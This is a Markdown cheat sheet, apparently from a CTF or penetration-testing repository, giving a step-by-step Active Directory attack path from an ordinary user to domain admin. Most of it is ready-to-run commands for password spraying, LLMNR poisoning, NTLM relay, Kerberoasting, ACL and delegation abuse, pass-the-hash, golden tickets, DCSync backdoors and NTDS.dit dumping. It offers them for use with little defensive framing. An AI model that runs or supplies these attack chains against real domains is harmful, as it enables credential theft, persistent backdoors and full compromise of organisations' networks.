# 🏢 Active Directory Attack Methodology

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Step-by-Step Guide from User to Domain Admin
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Attack Path Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     AD ATTACK METHODOLOGY                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   PHASE 1: Enumeration     PHASE 2: Initial Access    PHASE 3: PrivEsc │
│   ├── Network Scan         ├── Password Spray         ├── Kerberoast   │
│   ├── LDAP Enum            ├── LLMNR Poison           ├── AS-REP       │
│   ├── User Enum            └── NTLM Relay             └── ACL Abuse    │
│   └── BloodHound                                                        │
│                                                                         │
│   PHASE 4: Lateral Move    PHASE 5: Persistence      PHASE 6: Domain   │
│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key          └── Full Pwn!     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Table of Contents

1. [Phase 1: Enumeration](#-phase-1-enumeration)
2. [Phase 2: Initial Access](#-phase-2-initial-access)
3. [Phase 3: Privilege Escalation](#-phase-3-privilege-escalation)
4. [Phase 4: Lateral Movement](#-phase-4-lateral-movement)
5. [Phase 5: Persistence](#-phase-5-persistence)
6. [Phase 6: Domain Dominance](#-phase-6-domain-dominance)
7. [Quick Command Reference](#-quick-command-reference)

---

## 🔍 Phase 1: Enumeration

### 1.1 Network Discovery

```bash
# Find domain controllers
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identify AD services
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Key Ports:**
| Port | Service | Purpose |
|------|---------|---------|
| 53 | DNS | Domain resolution |
| 88 | Kerberos | Authentication |
| 389 | LDAP | Directory |
| 445 | SMB | File shares |
| 636 | LDAPS | Secure LDAP |
| 5985 | WinRM | Remote mgmt |

### 1.2 Anonymous Enumeration (No Creds)

```bash
# RPC null session
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# LDAP anonymous bind
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Kerbrute user enum (no creds!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 With Valid Credentials

```bash
# Get domain info
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP enumeration
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Find interesting targets
Get-DomainUser -SPN                    # Kerberoastable
Get-DomainUser -PreauthNotRequired      # AS-REP roastable
Get-DomainComputer -Unconstrained       # Delegation

# Find DA sessions
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 BloodHound Collection

```bash
# From Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# From Windows (SharpHound)
.\SharpHound.exe -c All
```

**BloodHound Queries:**
```cypher
# Shortest path to DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

# Users with DCSync rights
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🔑 Phase 2: Initial Access

### 2.1 Password Spraying

```bash
# CrackMapExec spray
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Kerbrute spray
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Common Passwords:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

### 2.2 LLMNR/NBT-NS Poisoning

```bash
# Terminal 1: Start Responder
sudo responder -I eth0 -wPv

# Wait for hashes...
# NTLMv2 captured!

# Terminal 2: Crack hash
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 NTLM Relay

```bash
# Find targets without SMB signing
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB off)
sudo responder -I eth0

# Relay attack
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting (No Password Required!)

```bash
# Find vulnerable users
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Or with creds
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

---

## ⬆️ Phase 3: Privilege Escalation

### 3.1 Kerberoasting

```bash
# From Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# From Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 ACL Abuse

**GenericAll on User:**
```powershell
# Change password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll on Group:**
```powershell
# Add yourself to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Set SPN for Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Give yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Delegation Attacks

**Unconstrained Delegation:**
```powershell
# Find targets
Get-DomainComputer -Unconstrained

# Monitor for TGTs
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Trigger (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Constrained Delegation:**
```bash
# Request ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Resource-Based Constrained Delegation (RBCD):**
```bash
# Create machine account
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Set RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Get ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

## ➡️ Phase 4: Lateral Movement

### 4.1 Pass-the-Hash

```bash
# PSExec with hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Export ticket
.\Rubeus.exe dump

# Use ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Use ticket (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM with password
evil-winrm -i 10.10.10.10 -u admin -p password

# With hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Get TGT with hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Now use Kerberos
dir \\server\share
```

---

## 🔒 Phase 5: Persistence

### 5.1 Golden Ticket

```bash
# Need: krbtgt NTLM hash + Domain SID

# Create ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Use
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Create service ticket
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 DCSync Backdoor

```powershell
# Add DCSync rights to any user
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

## 👑 Phase 6: Domain Dominance

### 6.1 DCSync

```bash
# Dump all hashes
impacket-secretsdump domain.local/admin:password@10.10.10.10

# With hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Specific user
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 NTDS.dit Extraction

```bash
# Create shadow copy
vssadmin create shadow /for=C:

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Extract offline
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 CrackMapExec Dump

```bash
# Dump NTDS via DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

## 📊 Quick Command Reference

### Enumeration One-Liners

```bash
# Find DCs
nmap -p 88,389 --open 10.10.10.0/24

# Enum users (no creds)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Find AS-REP roastable
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Attack Cheatsheet

| Attack | Command |
|--------|---------|
| Password Spray | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Hash Cracking

| Hash Type | Hashcat Mode |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 CTF Tips

1. **Always enumerate first** - Don't attack blindly
2. **Check for AS-REP** - Free hashes without creds!
3. **Run BloodHound** - Find attack paths
4. **Check ACLs** - Often misconfigured
5. **Look for delegation** - Easy wins
6. **Spray carefully** - Account lockouts!
7. **Save all credentials** - You'll need them later

---

## 📚 Related Cheatsheets

- [BloodHound](../BloodHound/README.md)
- [Impacket](../Impacket/README.md)
- [CrackMapExec](../CrackMapExec/README.md)
- [Rubeus](../Rubeus/README.md)
- [PowerView](../PowerView/README.md)
- [Responder](../Responder/README.md)
- [Evil-WinRM](../Evil-WinRM/README.md)
- [Mimikatz](../Mimikatz/README.md)

---

<p align="center">
  <b>🏢 From User to Domain Admin!</b><br>
  <i>Follow the methodology, own the domain</i>
</p>
